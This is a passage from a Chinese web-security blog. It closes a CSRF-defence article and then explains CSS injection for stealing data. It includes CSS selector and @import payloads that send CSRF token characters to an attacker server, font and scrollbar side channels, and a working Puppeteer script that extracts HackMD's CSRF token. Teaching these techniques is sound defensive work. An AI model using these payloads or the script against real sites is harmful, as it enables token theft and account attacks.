csrftoken 的值是什麼，也猜不出來，所以自然就無法進行攻擊了。 可是有另外一種狀況，假設你的 server 支持 cross origin 的 request，會發生什麼事呢？攻擊者就可以在他的頁面發起一個 request，順利拿到這個 csrf token 並且進行攻擊。不過前提是你的 server 接受這個 domain 的 request。 接著讓我們來看看另外一種解法 Double Submit Cookie上一種解法需要 server 的 state，亦即 csrf token 必須被保存在 server 當中，才能驗證正確性。而現在這個解法的好處就是完全不需要 server 儲存東西。 這個解法的前半段與剛剛的相似，由 server 產生一組隨機的 token 並且加在 form 上面。但不同的點在於，除了不用把這個值寫在 session 以外，同時也讓 client side 設定一個名叫 csrftoken 的 cookie，值也是同一組 token。 Set-Cookie: csrftoken=fj1iro2jro12ijoi1 &lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"> &lt;input type=\"hidden\" name=\"id\" value=\"3\"/> &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\"/> &lt;input type=\"submit\" value=\"刪除文章\"/> &lt;/form> 你可以仔細思考一下 CSRF 攻擊的 request 與使用者本人發出的 request 有什麼不一樣？不一樣的點就在於，前者來自不同的 domain，後者來自相同的 domain。所以我們只要有辦法區分出這個 request 是不是從同樣的 domain 來，我們就勝利了。 而 Double Submit Cookie 這個解法正是從這個想法出發。 當使用者按下 submit 的時候，server 比對 cookie 內的 csrftoken 與 form 裡面的 csrftoken，檢查是否有值並且相等，就知道是不是使用者發的了。 為什麼呢？假設現在攻擊者想要攻擊，他可以隨便在 form 裡面寫一個 csrf token，這當然沒問題，可是因為瀏覽器的限制，他並不能在他的 domain 設定 small-min.blog.com 的 cookie 啊！所以他發上來的 request 的 cookie 裡面就沒有 csrftoken，就會被擋下來。 當然，這個方法看似好用，但也是有缺點的，可以參考：Double Submit Cookies vulnerabilities，攻擊者如果掌握了你底下任何一個 subdomain，就可以幫你來寫 cookie，並且順利攻擊了。 client side 的 Double Submit Cookie會特別提到 client side，是因為我之前所碰到的專案是 Single Page Application，上網搜尋一下就會發現有人在問：「SPA 該如何拿到 CSRF token？」，難道要 server 再提供一個 api 嗎？這樣好像有點怪怪的。 但是呢，我認為我們可以利用 Double Submit Cookie 的精神來解決這個問題。而解決這問題的關鍵就在於：由 client side 來生 csrf token。就不用跟 server api 有任何的互動。 其他的流程都跟之前一樣，生成之後放到 form 裡面以及寫到 cookie。或者說如果你是 SPA 的話，也可以把這資訊直接放到 request header，你就不用在每一個表單都做這件事情，只要統一加一個地方就好。 事實上，我自己常用的 library axios 就有提供這樣的功能，你可以設置 header 名稱跟 cookie 名稱，設定好以後你每一個 request，它都會自動幫你把 header 填上 cookie 裡面的值。 &#x2F;&#x2F; &#96;xsrfCookieName&#96; is the name of the cookie to use as a value for xsrf token xsrfCookieName: &#39;XSRF-TOKEN&#39;, &#x2F;&#x2F; default &#x2F;&#x2F; &#96;xsrfHeaderName&#96; is the name of the http header that carries the xsrf token value xsrfHeaderName: &#39;X-XSRF-TOKEN&#39;, &#x2F;&#x2F; default 那為什麼由 client 來生這個 token 也可以呢？因為這個 token 本身的目的其實不包含任何資訊，只是為了「不讓攻擊者」猜出而已，所以由 client 還是由 server 來生成都是一樣的，只要確保不被猜出來即可。Double Submit Cookie 靠的核心概念是：「攻擊者的沒辦法讀寫目標網站的 cookie，所以 request 的 csrf token 會跟 cookie 內的不一樣」 browser 本身的防禦我們剛剛提到了使用者自己可以做的事、網頁前後端可以做的事情，那瀏覽器呢？之所以能成立 CSRF，是因為瀏覽器的機制所導致的，有沒有可能從瀏覽器方面下手，來解決這個問題呢？ 有！而且已經有了。而且啟用的方法非常非常簡單。 Google 在 Chrome 51 版的時候正式加入了這個功能：SameSite cookie，對詳細運行原理有興趣的可參考：draft-west-first-party-cookies-07。 先引一下 Google 的說明： Same-site cookies (née “First-Party-Only” (née “First-Party”)) allow servers to mitigate the risk of CSRF and information leakage attacks by asserting that a particular cookie should only be sent with requests initiated from the same registrable domain. 啟用這個功能有多簡單？超級無敵簡單。 你原本設置 Cookie 的 header 長這樣： Set-Cookie: session_id&#x3D;ewfewjf23o1; 你只要在後面多加一個 SameSite 就好： Set-Cookie: session_id&#x3D;ewfewjf23o1; SameSite 但其實 SameSite 有兩種模式，Lax跟Strict，默認是後者，你也可以自己指定模式： Set-Cookie: session_id&#x3D;ewfewjf23o1; SameSite&#x3D;Strict Set-Cookie: foo&#x3D;bar; SameSite&#x3D;Lax 我們先來談談默認的 Strict模式，當你加上 SameSite 這個關鍵字之後，就代表說「我這個 cookie 只允許 same site 使用，不應該在任何的 cross site request 被加上去」。 意思就是你加上去之後，我們上面所講的&lt;a href=&quot;&quot;&gt;, &lt;form&gt;, new XMLHttpRequest，只要是瀏覽器驗證不是在同一個 site 底下發出的 request，全部都不會帶上這個 cookie。 可是這樣其實會有個問題，連&lt;a href=&quot;...&quot;都不會帶上 cookie 的話，當我從 Google 搜尋結果或者是朋友貼給我的連結點進某個網站的時候，因為不會帶 cookie 的關係，所以那個網站就會變成是登出狀態。這樣子的使用者體驗非常不好。 有兩種解法，第一種是跟 Amazon 一樣，準備兩組不同的 cookie，第一組是讓你維持登入狀態，第二組則是做一些敏感操作的時候會需要用到的（例如說購買、設定帳戶等等）。第一組不設定 SameSite，所以無論你從哪邊來，都會是登入狀態。但攻擊者就算有第一組 cookie 也不能幹嘛，因為不能做任何操作。第二組因為設定了 SameSite 的緣故，所以完全避免掉 CSRF。 但這樣子還是有點小麻煩，所以你可以考慮第二種，就是調整為 SameSite 的另一種模式：Lax。 Lax 模式放寬了一些限制，例如說&lt;a&gt;, &lt;link rel=&quot;prerender&quot;&gt;, &lt;form method=&quot;GET&quot;&gt; 這些都還是會帶上 cookie。但是 POST 方法 的 form，或是只要是 POST, PUT, DELETE 這些方法，就不會帶上 cookie。 所以一方面你可以保有彈性，讓使用者從其他網站連進你的網站時還能夠維持登入狀態，一方面也可以防止掉 CSRF 攻擊。但 Lax 模式之下就沒辦法擋掉 GET 形式的 CSRF，這點要特別注意一下。 講到這種比較新的東西，相信大家一定都很想知道瀏覽器的支援度如何，caniuse 告訴我們說：目前只有 Chrome 支援這個新的特性（畢竟是 Google 自己推的方案，自己當然要支持一下）。 雖然瀏覽器的支援度不太高，但日後其他瀏覽器可能也會跟進實做這個方案，不妨在現在就把 SameSite 加上去，以後就不用再為 CSRF 煩惱了。 我其實只是大略的介紹一下，draft-west-first-party-cookies-07 裡面講到很多細節，例如說到底怎樣算是 cross site? 一定要在同一個 domain 嗎？那 sub domain 行不行？ 好奇的可以自己研究一下，或者是這篇：SameSite Cookie，防止 CSRF 攻击也有提到。 SameSite 相關的參考資料： Preventing CSRF with the same-site cookie attribute 再见，CSRF：讲解set-cookie中的SameSite属性 SameSite Cookie，防止 CSRF 攻击 SameSite——防御 CSRF &amp; XSSI 新机制 Cross-Site Request Forgery is dead! 總結這篇主要介紹了 CSRF 的攻擊原理以及兩種防禦方法，針對比較常見的場景做介紹。一般在做網頁開發的時候，比起 XSS，CSRF 是一個比較常被忽略的重點。在網頁上有任何比較重要的操作時，都要特別留意是否有被 CSRF 的風險。 這次找了很多參考資料，但發現跟 CSRF 有關的文章其實都大同小異，想知道更細節的地方需要花很多的心力去找，但幸好 Stackoverflow 上面也有不少資料可以參考。因為我在資訊安全這塊沒有涉獵太多，如果文章有哪部分講錯的話，還麻煩各位在留言不吝指出。 也感謝我朋友 shik 的指點，告訴我有 SameSite 這麼一個東西，讓我補上最後一段。 希望這篇文章能讓大家對 CSRF 有更全面的認識。 參考資料 Cross-Site Request Forgery (CSRF) Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet 一次较为深刻的CSRF认识 [技術分享] Cross-site Request Forgery (Part 2) Spring Security Reference CSRF 攻击的应对之道","link":"/2017/03/12/csrf-introduction/"},{"title":"用 CSS 來偷資料 - CSS injection（上）","text":"在講到針對網頁前端的攻擊時，你我的心中浮現的八成會是 XSS，但如果你沒辦法在網頁上執行 JavaScript，有沒有其他的攻擊手法呢？例如說，假設可以插入 style 標籤，你能夠做些什麼？ 在 2018 年的時候，我有寫過一篇 CSS keylogger：攻擊與防禦，那時剛好在 Hacker News 上面看到相關的討論，於是就花了點時間研究了一下。 而 4 年後的現在，我從資安的角度重新認識了這個攻擊手法，因此打算寫一兩篇文章來好好講解 CSS injection。 這篇的文章內容包含： 什麼是 CSS injection？ CSS 偷資料的原理 如何偷 hidden input 的資料 如何偷 meta 的資料 承上，並以 HackMD 為例 什麼是 CSS injection？顧名思義，CSS injection 代表的是你在一個頁面上可以插入任何的 CSS 語法，或是講得更明確一點，你可以使用 &lt;style&gt; 這個標籤。你可能會好奇，為什麼會有這種狀況？ 我自己認為常見的狀況有兩個，第一個是網站有過濾掉許多標籤，但不覺得 &lt;style&gt; 有問題，所以沒有過濾掉。例如說很多網站都會用現成的 library 來處理 sanitization，其中有一套很有名的叫做 DOMPurify。 在 DOMPurify(v2.4.0) 之中，預設就會幫你把各種危險的標籤全都過濾掉，只留下一些安全的，例如說 &lt;h1&gt; 或是 &lt;p&gt; 這種，而重點是 &lt;style&gt; 也在預設的安全標籤裡面，所以如果你沒有特別指定參數，在預設的狀況下，&lt;style&gt; 是不會被過濾掉的，因此攻擊者就可以注入 CSS。 第二種狀況則是雖然可以插入 HTML，但是由於 CSP（Content Security Policy）的緣故，沒有辦法執行 JavaScript。既然沒辦法執行 JavaScript，就只能退而求其次，看看有沒有辦法利用 CSS 做出一些惡意行為。 那到底有了 CSS injection 之後可以幹嘛？CSS 不是拿來裝飾網頁用的而已嗎？難道幫網頁的背景換顏色也可以是一個攻擊手法？ 利用 CSS 偷資料CSS 確實是拿來裝飾網頁用的，但是只要結合兩個特性，就可以使用 CSS 來偷資料。 第一個特性：屬性選擇器。 在 CSS 當中，有幾個選擇器可以選到「屬性符合某個條件的元素」。舉例來說，input[value^=a]，就可以選到 value 開頭是 a 的元素。 類似的選擇器有： input[value^=a] 開頭是 a 的（prefix） input[value$=a] 結尾是 a 的（suffix） input[value*=a] 內容有 a 的（contains） 而第二個特性是：可以利用 CSS 發出 request，例如說載入一張伺服器上的背景圖片，本質上就是在發一個 request。 假設現在頁面上有一段內容是 &lt;input name=&quot;secret&quot; value=&quot;abc123&quot;&gt;，而我能夠插入任何的 CSS，我可以這樣寫： input[name=\"secret\"][value^=\"a\"] &#123; background: url(https://myserver.com?q=a) &#125; input[name=\"secret\"][value^=\"b\"] &#123; background: url(https://myserver.com?q=b) &#125; input[name=\"secret\"][value^=\"c\"] &#123; background: url(https://myserver.com?q=c) &#125; //.... input[name=\"secret\"][value^=\"z\"] &#123; background: url(https://myserver.com?q=z) &#125; 會發生什麼事情？ 因為第一條規則有順利找到對應的元素，所以 input 的背景就會是一張伺服器上的圖片，而瀏覽器就會發 request 到 https://myserver.com?q=a。 因此，當我在 server 收到這個 request 的時候，我就知道「input 的 value 屬性，第一個字元是 a」，就順利偷到了第一個字元。 這就是 CSS 之所以可以偷資料的原因，透過屬性選擇器加上載入圖片這兩個功能，就能夠讓 server 知道頁面上某個元素的屬性值是什麼。 好，現在確認 CSS 可以偷屬性的值了，接下來有兩個問題： 有什麼東西好偷？ 你剛只示範偷第一個，要怎麼偷第二個字元？ 我們先來討論第一個問題，有哪些東西可以偷？通常都是要偷一些敏感資料對吧？ 最常見的目標，就是 CSRF token。如果你不知道什麼是 CSRF，可以先看看我之前寫過的這一篇：讓我們來談談 CSRF（話說我有打算寫新的 CSRF 系列文，拖稿中，想看的話可留言催稿）。 簡單來說呢，如果 CSRF token 被偷走，就有可能會被 CSRF 攻擊，總之你就想成這個 token 很重要就是了。而這個 CSRF token，通常都會被放在一個 hidden input 中，像是這樣： &lt;form action=\"/action\"> &lt;input type=\"hidden\" name=\"csrf-token\" value=\"abc123\"> &lt;input name=\"username\"> &lt;input type=\"submit\"> &lt;/form> 我們該怎麼偷到裡面的資料呢？ 偷 hidden input對於 hidden input 來說，照我們之前那樣寫是沒有效果的： input[name=\"csrf-token\"][value^=\"a\"] &#123; background: url(https://example.com?q=a) &#125; 因為 input 的 type 是 hidden，所以這個元素不會顯示在畫面上，既然不會顯示，那瀏覽器就沒有必要載入背景圖片，因此 server 不會收到任何 request。而這個限制非常嚴格，就算用 display:block !important; 也沒辦法蓋過去。 該怎麼辦呢？沒關係，我們還有別的選擇器，像是這樣： input[name=\"csrf-token\"][value^=\"a\"] + input &#123; background: url(https://example.com?q=a) &#125; 最後面多了一個 + input，這個加號是另外一個選擇器，意思是「選到後面的元素」，所以整個選擇器合在一起，就是「我要選 name 是 csrf-token，value 開頭是 a 的 input，的後面那個 input」，也就是 &lt;input name=&quot;username&quot;&gt;。 所以，真正載入背景圖片的其實是別的元素，而別的元素並沒有 type&#x3D;hidden，所以圖片會被正常載入。 那如果後面沒有其他元素怎麼辦？像是這樣： &lt;form action=\"/action\"> &lt;input name=\"username\"> &lt;input type=\"submit\"> &lt;input type=\"hidden\" name=\"csrf-token\" value=\"abc123\"> &lt;/form> 以這個案例來說，在以前就真的玩完了，因為 CSS 並沒有可以選到「前面的元素」的選擇器，所以真的束手無策。 但現在不一樣了，因為我們有了 :has，這個選擇器可以選到「底下符合特殊條件的元素」，像這樣： form:has(input[name=\"csrf-token\"][value^=\"a\"])&#123; background: url(https://example.com?q=a) &#125; 意思就是我要選到「底下有（符合那個條件的 input）的 form」，所以最後載入背景的會是 form，一樣也不是那個 hidden input。這個 has selector 很新，從上個月底釋出的 Chrome 105 開始才正式支援，目前只剩下 Firefox 的穩定版還沒支援了，詳情可看：caniuse 有了 has 以後，基本上就無敵了，因為可以指定改變背景的是哪個父元素，所以想怎麼選就怎麼選，怎樣都選得到。 偷 meta除了把資料放在 hidden input 以外，也有些網站會把資料放在 &lt;meta&gt; 裡面，例如說 &lt;meta name=&quot;csrf-token&quot; content=&quot;abc123&quot;&gt;，meta 這個元素一樣是看不見的元素，要怎麼偷呢？ 首先，如同上個段落的結尾講的一樣，has 是絕對偷得到的，可以這樣偷： html:has(meta[name=\"csrf-token\"][content^=\"a\"]) &#123; background: url(https://example.com?q=a); &#125; 但除此之外，還有其他方式也偷得到。 meta 雖然也看不到，但跟 hidden input 不同，我們可以自己用 CSS 讓這個元素變成可見： meta &#123; display: block; &#125; meta[name=\"csrf-token\"][content^=\"a\"] &#123; background: url(https://example.com?q=a); &#125; 可是這樣還不夠，你會發現 request 還是沒有送出，這是因為 meta 在 head 底下，而 head 也有預設的 display:none 屬性，因此也要幫 head 特別設置，才會讓 meta「能被看到」： head, meta &#123; display: block; &#125; meta[name=\"csrf-token\"][content^=\"a\"] &#123; background: url(https://example.com?q=a); &#125; 照上面這樣寫，就會看到瀏覽器發出 request。不過，畫面上倒是沒有顯示任何東西，因為畢竟 content 是一個屬性，而不是 HTML 的 text node，所以不會顯示在畫面上，但是 meta 這個元素本身其實是看得到的，這也是為什麼 request 會發出去： 如果你真的想要在畫面上顯示 content 的話，其實也做得到，可以利用偽元素搭配 attr： meta:before &#123; content: attr(content); &#125; 就會看到 meta 裡面的內容顯示在畫面上了。 最後，讓我們來看一個實際案例。 偷 HackMD 的資料HackMD 的 CSRF token 放在兩個地方，一個是 hidden input，另一個是 meta，內容如下： &lt;meta name=\"csrf-token\" content=\"h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI\"> 而 HackMD 其實支援 &lt;style&gt; 的使用，這個標籤不會被過濾掉，所以你是可以寫任何的 style 的，而相關的 CSP 如下： img-src * data:; style-src &#39;self&#39; &#39;unsafe-inline&#39; https:&#x2F;&#x2F;assets-cdn.github.com https:&#x2F;&#x2F;github.githubassets.com https:&#x2F;&#x2F;assets.hackmd.io https:&#x2F;&#x2F;www.google.com https:&#x2F;&#x2F;fonts.gstatic.com https:&#x2F;&#x2F;*.disquscdn.com; font-src &#39;self&#39; data: https:&#x2F;&#x2F;public.slidesharecdn.com https:&#x2F;&#x2F;assets.hackmd.io https:&#x2F;&#x2F;*.disquscdn.com https:&#x2F;&#x2F;script.hotjar.com; 可以看到 unsafe-inline 是允許的，所以可以插入任何的 CSS。 確認可以插入 CSS 以後，就可以開始來準備偷資料了。還記得前面有一個問題沒有回答，那就是「該怎麼偷第一個以後的字元？」，我先以 HackMD 為例回答。 首先，CSRF token 這種東西通常重新整理就會換一個，所以不能重新整理，而 HackMD 剛好支援即時更新，只要內容變了，會立刻反映在其他 client 的畫面上，因此可以做到「不重新整理而更新 style」，流程是這樣的： 準備好偷第一個字元的 style，插入到 HackMD 裡面 受害者打開頁面 伺服器收到第一個字元的 request 從伺服器更新 HackMD 內容，換成偷第二個字元的 payload 受害者頁面即時更新，載入新的 style 伺服器收到第二個字元的 request 不斷循環直到偷完所有字元 簡單的示意圖如下： 程式碼如下： const puppeteer = require('puppeteer'); const express = require('express') const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)); // Create a hackMD document and let anyone can view/edit const noteUrl = 'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf' const host = 'http://localhost:3000' const baseUrl = host + '/extract?q=' const port = process.env.PORT || 3000 ;(async function() &#123; const app = express() const browser = await puppeteer.launch(&#123; headless: true &#125;); const page = await browser.newPage(); await page.setViewport(&#123; width: 1280, height: 800 &#125;) await page.setRequestInterception(true); page.on('request', request => &#123; const url = request.url() // cancel request to self if (url.includes(baseUrl)) &#123; request.abort() &#125; else &#123; request.continue() &#125; &#125;); app.listen(port, () => &#123; console.log(`Listening at http://localhost:$&#123;port&#125;`) console.log('Waiting for server to get ready...') startExploit(app, page) &#125;) &#125;)() async function startExploit(app, page) &#123; let currentToken = '' await page.goto(noteUrl + '?edit'); // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele await page.addStyleTag(&#123; content: \"&#123;scroll-behavior: auto !important;&#125;\" &#125;); const initialPayload = generateCss() await updateCssPayload(page, initialPayload) console.log(`Server is ready, you can open $&#123;noteUrl&#125;?view on the browser`) app.get('/extract', (req, res) => &#123; const query = req.query.q if (!query) return res.end() console.log(`query: $&#123;query&#125;, progress: $&#123;query.length&#125;/36`) currentToken = query if (query.length === 36) &#123; console.log('over') return &#125; const payload = generateCss(currentToken) updateCssPayload(page, payload) res.end() &#125;) &#125; async function updateCssPayload(page, payload) &#123; await sleep(300) await page.click('.CodeMirror-line') await page.keyboard.down('Meta'); await page.keyboard.press('A'); await page.keyboard.up('Meta'); await page.keyboard.press('Backspace'); await sleep(300) await page.keyboard.sendCharacter(payload) console.log('Updated css payload, waiting for next request') &#125; function generateCss(prefix = \"\") &#123; const csrfTokenChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'.split('') return ` $&#123;prefix&#125; &lt;style> head, meta &#123; display: block; &#125; $&#123; csrfTokenChars.map(char => ` meta[name=\"csrf-token\"][content^=\"$&#123;prefix + char&#125;\"] &#123; background: url($&#123;baseUrl&#125;$&#123;prefix + char&#125;) &#125; `).join('\\n') &#125; &lt;/style> ` &#125; 可以直接用 Node.js 跑起來，跑起來以後在瀏覽器打開相對應的文件，就可以在 terminal 看到 leak 的進度。 不過呢，就算偷到了 HackMD 的 CSRF token，依然還是沒辦法 CSRF，因為 HackMD 有在 server 檢查其他的 HTTP request header 如 origin 或是 referer 等等，確保 request 來自合法的地方。 總結在這篇裡面，我們看到了之所以可以用 CSS 來偷資料的原理，說穿了就是利用「屬性選擇器」再加上「載入圖片」這兩個簡單的功能，也示範了如何偷取 hidden input 跟 meta 裡的資料，並且以 HackMD當作實際案例說明。 但是呢，有幾個問題我們還沒解決，像是： HackMD 因為可以即時同步內容，所以不需要重新整理就可以載入新的 style，那其他網站呢？該怎麼偷到第二個以後的字元？ 一次只能偷一個字元的話，是不是要偷很久呢？這在實際上可行嗎？ 有沒有辦法偷到屬性以外的東西？例如說頁面上的文字內容，或甚至是 JavaScript 的程式碼？ 針對這個攻擊手法的防禦方式有哪些？ 這些問題，我們會在下一篇裡面一一解答。 下集傳送門：https://blog.huli.tw/2022/09/29/css-injection-2","link":"/2022/09/29/css-injection-1/"},{"title":"用 CSS 來偷資料 - CSS injection（下）","text":"在上集裡面，我們知道了基本的 CSS 偷資料原理，並且以 HackMD 作為實際案例示範，成功偷到了 CSRF token，而這篇則是要深入去看 CSS injection 的一些細節，解決以下問題： HackMD 因為可以即時同步內容，所以不需要重新整理就可以載入新的 style，那其他網站呢？該怎麼偷到第二個以後的字元？ 一次只能偷一個字元的話，是不是要偷很久呢？這在實際上可行嗎？ 有沒有辦法偷到屬性以外的東西？例如說頁面上的文字內容，或甚至是 JavaScript 的程式碼？ 針對這個攻擊手法的防禦方式有哪些？ 偷到所有字元在上集裡面我們有提到，我們想偷的資料有可能只要重新整理以後就會改變（如 CSRF token），所以我們必須在不重新整理的狀況之下載入新的 style。 上一篇裡面之所以做得到，是因為 HackMD 本身就是一個標榜即時更新的文件，但如果是一般的網頁呢？在不能用 JavaScript 的情況下，該如何不斷動態載入新的 style？ 有關於這個問題，在 CSS Injection Attacks 這份簡報裡面給出了解答：@import。 在 CSS 裡面，你可以用 @import 去把外部的其他 style 引入進來，就像 JavaScript 的 import 那樣。 我們可以利用這個功能做出引入 style 的迴圈，如下面的程式碼： @import url(https://myserver.com/start?len=8) 接著，在 server 回傳如下的 style： @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) 重點來了，這邊雖然一次引入了 8 個，但是「後面 7 個 request，server 都會先 hang 住，不會給 response」，只有第一個網址 https://myserver.com/payload?len=1 會回傳 response，內容為之前提過的偷資料 payload： input[name=\"secret\"][value^=\"a\"] &#123; background: url(https://b.myserver.com/leak?q=a) &#125; input[name=\"secret\"][value^=\"b\"] &#123; background: url(https://b.myserver.com/leak?q=b) &#125; input[name=\"secret\"][value^=\"c\"] &#123; background: url(https://b.myserver.com/leak?q=c) &#125; //.... input[name=\"secret\"][value^=\"z\"] &#123; background: url(https://b.myserver.com/leak?q=z) &#125; 當瀏覽器收到 response 的時候，就會先載入上面這一段 CSS，載入完以後符合條件的元素就會發 request 到後端，假設第一個字是 d 好了，接著 server 這時候才回傳 https://myserver.com/payload?len=2 的 response，內容為： input[name=\"secret\"][value^=\"da\"] &#123; background: url(https://b.myserver.com/leak?q=da) &#125; input[name=\"secret\"][value^=\"db\"] &#123; background: url(https://b.myserver.com/leak?q=db) &#125; input[name=\"secret\"][value^=\"dc\"] &#123; background: url(https://b.myserver.com/leak?q=dc) &#125; //.... input[name=\"secret\"][value^=\"dz\"] &#123; background: url(https://b.myserver.com/leak?q=dz) &#125; 以此類推，只要不斷重複這些步驟，就可以把所有字元都傳到 server 去，靠的就是 import 會先載入已經下載好的 resource，然後去等待還沒下載好的特性。 這邊有一點要特別注意，你會發現我們載入 style 的 domain 是 myserver.com，而背景圖片的 domain 是 b.myserver.com，這是因為瀏覽器通常對於一個 domain 能同時載入的 request 有數量上的限制，所以如果你全部都是用 myserver.com 的話，會發現背景圖片的 request 送不出去，都被 CSS import 給卡住了。 因此需要設置兩個 domain，來避免這種狀況。 除此之外，上面這種方式在 Firefox 是行不通的，因為在 Firefox 上就算第一個的 response 先回來，也不會立刻更新 style，要等所有 request 都回來才會一起更新。解法的話可以參考這一篇：CSS data exfiltration in Firefox via a single injection point，把第一步的 import 拿掉，然後每一個字元的 import 都用額外的 style 包著，像這樣： &lt;style>@import url(https://myserver.com/payload?len=1)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=2)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=3)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=4)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=5)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=6)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=7)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=8)&lt;/style> 而上面這樣 Chrome 也是沒問題的，所以統一改成上面這樣，就可以同時支援兩種瀏覽器了。 總結一下，只要用 @import 這個 CSS 的功能，就可以做到「不重新載入頁面，但可以動態載入新的 style」，進而偷取後面的每一個字元。 一次偷一個字元，太慢了吧？若是想要在現實世界中執行這種攻擊，效率可能要再更好一點。以 HackMD 為例，CSRF token 總共有 36 個字，所以就要發 36 個 request，確實是太多了點。 事實上，我們一次可以偷兩個字元，因為上集有講過除了 prefix selector 以外，也有 suffix selector，所以可以像這樣： input[name=\"secret\"][value^=\"a\"] &#123; background: url(https://b.myserver.com/leak?q=a) &#125; input[name=\"secret\"][value^=\"b\"] &#123; background: url(https://b.myserver.com/leak?q=b) &#125; // ... input[name=\"secret\"][value$=\"a\"] &#123; border-background: url(https://b.myserver2.com/suffix?q=a) &#125; input[name=\"secret\"][value$=\"b\"] &#123; border-background: url(https://b.myserver2.com/suffix?q=b) &#125; 除了偷開頭以外，我們也偷結尾，效率立刻變成兩倍。要特別注意的是開頭跟結尾的 CSS，一個用的是 background，另一個用的是 border-background，是不同的屬性，因為如果用同一個屬性的話，內容就會被其他的蓋掉，最後只會發出一個 request。 若是內容可能出現的字元不多，例如說 16 個的話，那我們可以直接一次偷兩個開頭加上兩個結尾，總共的 CSS rule 數量為 16*16*2 &#x3D; 512 個，應該還在可以接受的範圍內，就能夠再加速兩倍。 除此之外，也可以朝 server 那邊去改善，例如說改用 HTTP&#x2F;2 或甚至是 HTTP&#x2F;3，都有機會能夠加速 request 載入的速度，進而提升效率。 偷其他東西除了偷屬性之外，有沒有辦法偷到其他東西？例如說，頁面上的其他文字？或甚至是 script 裡面的程式碼？ 根據我們在上一篇裡面講的原理，是做不到的。因為能偷到屬性是因為「屬性選擇器」這個東西，才讓我們選到特定的元素，而在 CSS 裡面，並沒有可以選擇「內文」的選擇器。 因此，我們需要對 CSS 以及網頁上的樣式有更深入的理解，才有辦法達成這件看似不可能的任務。 unicode-range在 CSS 裡面，有一個屬性叫做「unicode-range」，可以針對不同的字元，載入不同的字體。像是底下這個從 MDN 拿來的範例： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"Ampersand\"; src: local(\"Times New Roman\"); unicode-range: U+26; &#125; div &#123; font-size: 4em; font-family: Ampersand, Helvetica, sans-serif; &#125; &lt;/style> &lt;div>Me &amp; You = Us&lt;/div> &lt;/body> &lt;/html> &amp; 的 unicode 是 U+0026，因此只有 &amp; 這個字會用不同的字體來顯示，其他都用同一個字體。 這招前端工程師可能有用過，例如說英文跟中文如果要用不同字體來顯示，就很適合用這一招。而這招也可以用來偷取頁面上的文字，像這樣： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"f1\"; src: url(https://myserver.com?q=1); unicode-range: U+31; &#125; @font-face &#123; font-family: \"f2\"; src: url(https://myserver.com?q=2); unicode-range: U+32; &#125; @font-face &#123; font-family: \"f3\"; src: url(https://myserver.com?q=3); unicode-range: U+33; &#125; @font-face &#123; font-family: \"fa\"; src: url(https://myserver.com?q=a); unicode-range: U+61; &#125; @font-face &#123; font-family: \"fb\"; src: url(https://myserver.com?q=b); unicode-range: U+62; &#125; @font-face &#123; font-family: \"fc\"; src: url(https://myserver.com?q=c); unicode-range: U+63; &#125; div &#123; font-size: 4em; font-family: f1, f2, f3, fa, fb, fc; &#125; &lt;/style> Secret: &lt;div>ca31a&lt;/div> &lt;/body> &lt;/html> 如果你去看 network tab，會看到一共發送了 4 個 request： 藉由這招，我們可以得知頁面上有：13ac 這四個字元。 而這招的侷限之處也很明顯，就是： 我們不知道字元的順序為何 重複的字元也不會知道 但是從「載入字型」的角度下去思考怎麼偷到字元，著實帶給了許多人一個新的思考方式，並發展出各式各樣其他的方法。 字體高度差異 + first-line + scrollbar這招要解決的主要是上一招碰到的問題：「沒辦法知道字元順序」，然後這招結合了很多細節，步驟很多，要仔細聽了。 首先，我們其實可以不載入外部字體，用內建的字體就能 leak 出字元。這要怎麼做到呢？我們要先找出兩組內建字體，高度會不同。 例如有一個叫做「Comic Sans MS」的字體，高度就比另一個「Courier New」高。 舉個例子，假設預設字體的高度是 30px，而 Comic Sans MS 是 45px 好了。那現在我們把文字區塊的高度設成 40px，並且載入字體，像這樣： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"fa\"; src:local('Comic Sans MS'); font-style:monospace; unicode-range: U+41; &#125; div &#123; font-size: 30px; height: 40px; width: 100px; font-family: fa, \"Courier New\"; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; &#125; &lt;/style> Secret: &lt;div>DBC&lt;/div> &lt;div>ABC&lt;/div> &lt;/body> &lt;/html> 就會在畫面上看到差異： 很明顯 A 比其他字元的高度都高，而且根據我們的 CSS 設定，如果內容高度超過容器高度，會出現 scrollbar。雖然上面是截圖看不出來，但是下面的 ABC 有出現 scrollbar，而上面的 DBC 沒有。 再者，我們其實可以幫 scrollbar 設定一個外部的背景： div::-webkit-scrollbar &#123; background: blue; &#125; div::-webkit-scrollbar:vertical &#123; background: url(https://myserver.com?q=a); &#125; 也就是說，如果 scrollbar 有出現，我們的 server 就會收到 request。如果 scrollbar 沒出現，就不會收到 request。 更進一步來說，當我把 div 套用 “fa” 字體時，如果畫面上有 A，就會出現 scrollbar，server 就會收到 request。如果畫面上沒有 A，就什麼事情都不會發生。 因此，我如果一直重複載入不同字體，那我在 server 就能知道畫面上有什麼字元，這點跟剛剛我們用 unicode-range 能做到的事情是一樣的。 那要怎麼解決順序的問題呢？ 我們可以先把 div 